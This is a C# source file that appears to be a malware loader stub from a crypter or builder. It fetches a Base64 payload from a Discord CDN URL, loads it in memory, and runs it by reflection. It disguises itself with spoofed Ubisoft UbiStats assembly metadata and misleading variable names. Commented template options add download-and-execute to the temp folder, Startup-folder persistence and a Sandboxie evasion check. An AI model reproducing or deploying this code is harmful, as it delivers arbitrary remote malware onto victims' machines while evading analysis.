using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;




//Default [assembly: AssemblyTitle("UbiStats")]
//Default [assembly: AssemblyDescription("UbiStats for ALL_ALL_GLOBAL")]
//Default [assembly: AssemblyCompany("Ubisoft")]
//Default [assembly: AssemblyProduct("Ubisoft UbiStats ")]
//Default [assembly: AssemblyCopyright("Copyright Â© 2005")]
//Default [assembly: AssemblyFileVersion("2.5.0.1")]

//Assembly [assembly: AssemblyTitle("{1}")]
//Assembly [assembly: AssemblyDescription("{2}")]
//Assembly [assembly: AssemblyCompany("{3}")]
//Assembly [assembly: AssemblyProduct("{4}")]
//Assembly [assembly: AssemblyCopyright("{5}")]
//Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]


    public class Program
    {
        [STAThread]
        public static void Main(string[] args)
        {
            using (WebClient web = new WebClient())
            {

                try
                {


                   //sandboxie controlsandboxie();

                    //Messega



                    //download try
                    //download {
                    //download  System.Net.WebClient appyrun = new System.Net.WebClient();
                    //download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
                    //download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
                    //download }
                    //download catch
                    //download {
                    //download }







                    string ilspy;

                    ilspy = "https://cdn.discordapp.com/attachments/841595401253158954/844366341158076416/upload.txt";

                    WebClient HT203794;

                    HT203794 = new WebClient();

                    string stats;

                    stats = HT203794.DownloadString(ilspy);


                    byte[] onedrive;

                    string download = "https://onedrive.live.com/";

                    Console.WriteLine(download);

                    onedrive = Convert.FromBase64String(stats);

                    string translator = "ShutDown.frmclass";

                    object cfg = new object[] {%aPP%, string.Empty, web.DownloadData("%Server%"), true };

                    string waf = translator;

                    AppDomain.CurrentDomain.Load(onedrive).GetType(waf).InvokeMember("stat", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])cfg);



                    //start  {
                    //start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
                    //start  }




                }
                catch { return; }




                   


            }

        }

        //sandboxie [DllImport("kernel32.dll")]
        //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
        //sandboxie static void controlsandboxie()
        //sandboxie {
        //sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
        //sandboxie     {
        //sandboxie        Environment.Exit(1);
        //sandboxie     }
        //sandboxie }
    }
